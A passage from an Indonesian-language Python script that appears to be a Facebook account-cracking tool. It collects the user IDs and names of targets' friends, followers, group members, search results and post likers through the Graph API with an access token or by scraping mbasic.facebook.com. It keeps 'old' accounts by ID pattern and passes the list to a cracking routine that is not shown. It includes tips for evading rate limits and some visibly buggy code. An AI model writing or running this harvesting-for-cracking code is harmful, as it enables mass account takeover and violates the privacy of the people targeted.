	print(f"{P}[•] Ketikan {B}me{P} jika ingin dump id dari pertemanan sendiri")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	pil = input(f"{P}[•] Userid target : {B}")
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Informasi target")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Username : {I}{str(grex)}")
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Id tidak ditemukan atau id tersebut privat")
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Koneksi internet terputuskan")
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}|{i['name']}")
			print(f"\r{P}[•] {B}++++++++++++> {I}{len(id)}",end="")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Total pengumpulan : {I}{str(len(id))}")
		proses_crackkk()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Koneksi internet terputus")
		exit()
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pertemanan tidak di publikan")
		exit()
		
def dump_follower():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id targer bersifat publik")
	print(f"{P}[•] ketikan {B}me{P} Jika ingin dump id dari pertemanan")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	pil = input(f"{P}[•] Masukan user id : {B}")
	try:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		jumlah = int(input(f"{P}[•] Masukan limit : {B}"))
		if jumlah>50000:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}Maksimal 50000 ID")
			time.sleep(0.5)
			dump_follower()
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Informasi target yang di dump")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Username : {I}{str(grex)}")
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Userid tidak ditemukan coba pastikan id tersebut kokoh ")
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Koneksi internet bermasalah priksa & coba lagi :)")
		exit()
	try:
		koh2 = requests.get("https://graph.facebook.com/"+pil+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		koh3 = json.loads(koh2.text)
		for pi in koh3['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Total pengumpulan id : {I}{str(len(id))}")
		proses_crackkk()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Id tersebut tidak memiliki pertemanan atau tidak publik")
		exit()
		
def oldpublik():
        try:
                token = open("token.txt","r").read()
        except IOError:
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{P}[•] Token modar dinggo wae")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                nada = int(input(f"{P}[•] Mau crack menggunakan berapa id : {B}"))
                if nada>10:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} Maksimal 10 ID")
                        time.sleep(0.5)
                        oldfollow()
        except ValueError:
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{P}[•]{M} Input Invalid")
                time.sleep(0.5)
                oldfollow()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                uid = input(f"{P}[•] Masukkan ID Target Ke {K}{dot}{P} : {B}")
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•] Username : {I}{tulul['name']}")
                except KeyError:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get(f'https://graph.facebook.com/{uid}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
                        for cew in bulu['friends']['data']:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•] Total id : {I}{len(non_old)}")
                        print(f"{P}[•] Total id old : {I}{tampung}")
                except requests.exceptions.ConnectionError:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•] Jumlah total id Old : "+I+"%s"%(len(id)))
        proses_crackkk()
def oldfollow():
        try:
                token = open("token.txt","r").read()
        except IOError:
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{P}[•] Token modar dinggo wae ")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                nada = int(input(f"{P}[•] Mau crack menggunakan brapa id : {B}"))
                if nada>10:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} Maksimal 10 ID")
                        time.sleep(0.5)
                        oldfollow()
        except ValueError:
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{B} | ")
                print(f"{P}[•]{M} Input Invalid")
                time.sleep(0.5)
                oldfollow()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(f"{P}[•] Masukkan ID Target Ke {K}{dot}{P} : {B}")
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•] Username : {I}{tulul['name']} ")
                except KeyError:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit=1000000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•] Total id : {I}{len(non_old)}")
                        print(f"{P}[•] Total id old: "+I+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{B} | ")
                        print(f"{P}[•]{M} Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•] Jumlah total id old: "+I+"%s"%(len(id)))
        proses_crackkk()

# DUMP ID MASSAL
def dump_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id target bersifat publik")
	print(f"{P}[•] Masukan jumlah id limit (10limit)")
	try:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		jum = int(input(f"{P}[•] Berapa id : {B}"))
	except ValueError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Input yang anda masukan bukan angka")
		exit()
	if jum<1 or jum>10:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Out of range men")
		exit()
	uid = []
	yz = 0
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Ketikan {B}me{P} jiak ingin dump pertemanan sendiri")
	for met in range(jum):
		yz+=1
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			po = requests.get(f'https://graph.facebook.com/{kl}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}|{i['name']}")
				print(f"\r{P}[•] {B}++++++++++++> {I}{len(id)}",end="")
				#print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•]{M} Koneksi internet bermasalah priksa & coba lagi ")
			exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Berhasil mengumpulkan id {B}------>{len(id)}")
	proses_crackkk()
	
def dump_follower_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id target bersifat publik")
	print(f"{P}[•] Masukqn jumlah id (limit10)")
	try:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		jum = int(input(f"{P}[•] Berapa id : {B}"))
	except ValueError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Input yang anda masukan bukan angka")
		exit()
	if jum<1 or jum>10:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Masukan dengan benar ya bangsat")
		exit()
	uid = []
	yz = 0
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Ketikan {B}me{P} jika ingin dump id pertemanan sendiri")
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			po = requests.get(f'https://graph.facebook.com/{kl}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}|{i['name']}")
				print(f"\r{P}[•] {B}++++++++++++> {I}{len(id)}",end="")
				#print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Koneksi internet bermasalah ")
			exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Berhasil mengumpulkan id {B}-------> {I}{len(id)}")
	proses_crackkk()
def grup():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan group tersebut bersifat publik")
	print(f"{P}[•] jika terjadi stuck harap mode pesawat 2 detik")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	id = input(f"{P}[•] Userid group : {B}")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		print(balmond+l+" Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Grup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Nama Grup : {I}{berr2}")
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Anggota : {M}-")
	else:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Anggota : {I}{str(ang[0])}")
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] {M}Jika terjadi stuck harap mode pesawat 2-5 detik :)")
	print(f"{P}[•] Sedang Mengumpulkan ID")
	print(f"{P}[•] Tekan CTRL + C Untuk Stop")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						rq = random.choice(["😡","😰","😭","😇","😅","😎"])
						id.append(idku)
						print((f"\r[•] Mengumpulkan id {B}-------> {I}{str(len(id))}") , end="");sys.stdout.flush()
#						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						rq = random.choice(["😡","😰","😭","😇","😅","😎"])
						id.append(idku)
						print((f"\r[•] Mengumpulkan id {B}-------> {I}{str(len(id))}") , end="");sys.stdout.flush()
#						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
						pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(0)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
			
def nama():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	nama = input(f"{P}[•] Cari nama : {B}")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Tekan CTRL + C Untuk Stop")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	link = []
	na = []
	cuy = random.choice(['0','10','20','30','40','50','60'])
	cuy2 = random.choice(['0','1','2','3','4','5'])
	cuy3 = random.choice(['0','50','100','150','200'])
	cuy4 = random.choice(['0','10','20','30','40','50','100','150','200','250','300','350','5000'])
	ses = requests.Session()
	while True:
		try:
			li = nama.replace(' ','+')
			try:
				lord = link[0]
			except IndexError:
				lord = 'https://mbasic.facebook.com/public/'+li
			r = parser(ses.get(lord).text,'html.parser')
			ll = r.find_all('a')
			for c in ll:
				if c.text=='Lihat Hasil Selanjutnya':
					lol = str(c).replace('<a href="','').replace('amp;','')
					link_ = lol.split(' ')[0].replace('"><img','')
				for de in str(c).split('"'):
					xf = de.split(',')
					if ' profile picture' in xf:
						name_ = xf[0]
						lit = str(c).split('"')[1].replace('/','').replace('profile.php?id=','')
						na.insert(0,name_)
						if lit+'|'+name_ in id:
							continue
						else:
							id.append(lit+'|'+name_)
							#print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
							print((f"\r[•] Mengumpulkan id {B}-------> {I}{str(len(id))}") , end="");sys.stdout.flush()
			try:
				link7 = link_
			except:
				link7 = 'taik'
			if link7=='taik':
				if len(id)==0:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•]{M} Limit silahkan mode pesawat dan  coba lagi..")
					time.sleep(0.5)
					exit()
				else:pass
				try:
					bill = na[5000]
					link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy4)].replace(' ','+'))
				except:
					try:
						bill = na[220]
						link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy3)].replace(' ','+'))
					except:
						try:
							bill = na[55]
							link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy)].replace(' ','+'))
						except:
							try:
								link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy2)].replace(' ','+'))
							except:
								lah()
			else:
				try:
					both = link[0]
					if link7==both:
						try:
							bill = na[5000]
							link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy4)].replace(' ','+'))
						except:
							try:
								bill = na[220]
								link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy3)].replace(' ','+'))
							except:
								try:
									bill = na[55]
									link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy)].replace(' ','+'))
								except:
									try:
										link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy2)].replace(' ','+'))
									except:
										lah()
					else:
						link.insert(0,link7)
				except:
					link.insert(0,link7)
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(0)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
			
def like():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id postingan bersifat publik")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	pil = input(f"{P}[•] Masukan id postingan : {B}")
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Username : {I}{str(grex)}")
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Id tidak di temukan mungkin privat")
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Koneksi internet bermasalah")
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,likes.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['likes']['data']:
			id.append(f"{i['id']}|{i['name']}")
			print(f"\r{P}[•] {B}++++++++++++> {I}{len(id)}",end="")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Total pengumpulan id : {I}{str(len(id))}")
		proses_crackkk()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Koneksi internet bermasalah priksa dan coba lagi :-/")
		exit()
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pertemanan tidak di publikan atau token modar ")
		exit()
		
def likes():
	try:
		toket = open('token.txt', 'r').read()
	except IOError:
		os.system('rm -rf token.txt')
		time.sleep(0.01)
		os.sys.exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id postingan bersifat publik :)")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	idt = input(f"{P}[•] Masukan id postingan : {B}")
	try:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		jumlah = int(input(f"{P}[•] Masukan limit : {B}"))
		if jumlah>20000:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}Maksimal 20000 ID")
			time.sleep(0.5)
			likes()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+str(jumlah)+"&access_token="+toket)
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Pertemanan tidak publik atau token modar anjink")
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Total pengumpulan id : {B}{str(len(id))}")
	proses_crackkk ()
	
def share():
	try:
		toket = open('token.txt', 'r').read()
	except IOError:
		os.system('rm -rf token.txt')
		time.sleep(0.01)
		os.sys.exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id postingan bersifat publik ya bangsat")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	idt = input(f"{P}[•] Masukan id postingan : {B}")
	try:
		r=requests.get("https://graph.facebooklcom/me/feed?link={idt}&published=0&access_token={token}")
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Pertemanan tidak di publikan atau token modar")
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Total pengumpulan id : {B}{str(len(id))}")
	proses_crackkk ()
def dump_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id postingan bersifat publik")
	print(f"{P}[•] Masukan jumlah id limit 10")
	try:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		jum = int(input(f"[•] Berapa id : {B}"))
	except ValueError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Input yang anda masukan bukan angka ")
		exit()
	if jum<1 or jum>10:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Limit cuma 10 anjink ")
		exit()
	uid = []
	yz = 0
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Ketik {B}me{P} jika ingin dump pertemanan id sendiri")
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			po = requests.get(f'https://graph.facebook.com/{kl}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}|{i['name']}")
				print(f"\r{P}[•] {B}++++++++++++> {I}{len(id)}",end="")
#				print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
			print("")
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•]{M} Koneksi internet anda buruk ")
			exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Total pengumpulan id : {B}{len(id)}")
	proses_crackkk()
	

def lah():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"\r{P}[•] Total id : {I}{str(len(id))}")
	input(f"{P}[•]{I} Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	proses_crackkk()



def like():
	try:
		token = open('masuk.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan idz postingan bersifat publik ")
	print(f"{B} | ")
	pil = input(f"{P}[•] Masukan id postingan : {B}")
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Nama target : {I}{str(grex)}")
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Id tidak di temukan")
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
